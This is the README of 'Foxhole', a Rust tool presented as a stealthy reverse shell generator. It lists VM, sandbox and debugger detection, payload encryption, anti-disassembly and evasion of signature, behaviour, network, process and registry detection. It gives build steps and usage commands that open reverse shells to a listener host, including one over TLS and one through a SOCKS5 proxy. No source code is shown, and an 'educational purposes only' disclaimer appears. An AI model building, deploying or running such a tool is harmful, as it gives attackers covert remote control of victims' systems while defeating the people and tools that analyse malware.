# Foxhole

A stealthy, cross-platform reverse shell generator in Rust.

## Features

- **Multiple Connection Methods**
  - TCP
  - UDP
  - WebSocket
  - HTTP (planned)
  - DNS tunneling (planned)
  - ICMP tunneling (planned)

- **Advanced Anti-Detection**
  - VM detection
  - Sandbox detection
  - Debugger detection
  - Analysis tool detection
  - Timing-based detection
  - Hardware fingerprinting
  - Process monitoring
  - Registry scanning
  - DLL injection detection

- **Obfuscation Techniques**
  - XOR encryption
  - RC4 encryption
  - AES encryption
  - Control flow obfuscation
  - Anti-disassembly techniques
  - Dynamic key generation

- **Security Features**
  - TLS support
  - Proxy support (SOCKS5, HTTP)
  - Connection retry logic
  - Timeout handling
  - Error handling
  - Cross-platform compatibility

- **Defense Evasion**
  - Signature detection evasion
  - Behavior detection evasion
  - Network detection evasion
  - Process detection evasion
  - File detection evasion
  - Registry detection evasion

## Requirements

- Rust 1.70 or later
- OpenSSL development libraries
- Windows SDK (for Windows builds)
- Cross-compilation toolchains (for cross-platform builds)

## Installation

1. Clone the repository:
```bash
git clone https://github.com/yourusername/foxhole.git
cd foxhole
```

2. Build the project:
```bash
cargo build --release
```

## Usage

### Command Line Arguments

```bash
foxhole [OPTIONS]

Options:
    -h, --host <HOST>           Server host address
    -p, --port <PORT>           Server port number
    -m, --method <METHOD>       Connection method (tcp, udp, websocket, http, dns, icmp)
    -t, --tls                   Enable TLS encryption
    -x, --proxy <PROXY>         Proxy configuration (format: type:host:port)
    -k, --key <KEY>             Encryption key (optional)
    -r, --retry <COUNT>         Number of connection retries
    -d, --delay <SECONDS>       Delay between retries
    -v, --verbose              Enable verbose output
    --help                     Display this help message
```

### Example

```bash
# Basic TCP connection
foxhole -h 192.168.1.100 -p 4444

# WebSocket connection with TLS
foxhole -h example.com -p 443 -m websocket -t

# UDP connection with proxy
foxhole -h 192.168.1.100 -p 4444 -m udp -x socks5:proxy.example.com:1080
```

## Anti-Detection Features

### VM Detection
- Checks for VM-specific processes
- Detects VM-related files and directories
- Scans for VM registry keys
- Identifies VM hardware characteristics
- Monitors VM-specific DLLs
- Analyzes timing patterns
- Detects VM keyboard patterns
- Identifies VM computer names

### Sandbox Detection
- Identifies sandbox processes
- Detects sandbox-specific files
- Scans for sandbox registry keys
- Monitors sandbox DLLs
- Analyzes timing patterns
- Detects sandbox keyboard patterns
- Identifies sandbox computer names

### Debugger Detection
- Identifies debugger processes
- Detects debugger DLLs
- Monitors timing patterns
- Detects debugger keyboard patterns
- Identifies debugger computer names

### Analysis Tool Detection
- Identifies analysis processes
- Detects analysis-specific files
- Scans for analysis registry keys
- Monitors analysis DLLs
- Analyzes timing patterns
- Detects analysis keyboard patterns
- Identifies analysis computer names

## Obfuscation Techniques

### Encryption Methods
- XOR encryption with dynamic key generation
- RC4 encryption with variable key length
- AES encryption with configurable key size

### Code Obfuscation
- Control flow obfuscation
- Anti-disassembly techniques
- Dynamic code generation
- Junk instruction insertion
- Conditional jump manipulation

## Security Considerations

- All connections are encrypted by default
- TLS support for secure communication
- Proxy support for additional anonymity
- Connection retry logic for reliability
- Timeout handling to prevent hanging
- Comprehensive error handling
- Cross-platform compatibility

## Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## Disclaimer

This tool is for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this program.

## Defense Evasion Features

### Signature Detection Evasion
- Modifies process name and path
- Modifies process memory
- Changes module names
- Alters memory patterns

### Behavior Detection Evasion
- Simulates normal process behavior
- Modifies process activity patterns
- Changes module behavior
- Alters memory access patterns

### Network Detection Evasion
- Modifies network behavior
- Changes network patterns
- Alters connection characteristics
- Simulates normal network activity

### Process Detection Evasion
- Hides process from detection
- Modifies process memory
- Changes process characteristics
- Alters process behavior

### File Detection Evasion
- Modifies file attributes
- Changes file content
- Alters file patterns
- Simulates normal file activity

### Registry Detection Evasion
- Modifies registry entries
- Changes registry patterns
- Alters registry behavior
- Simulates normal registry activity 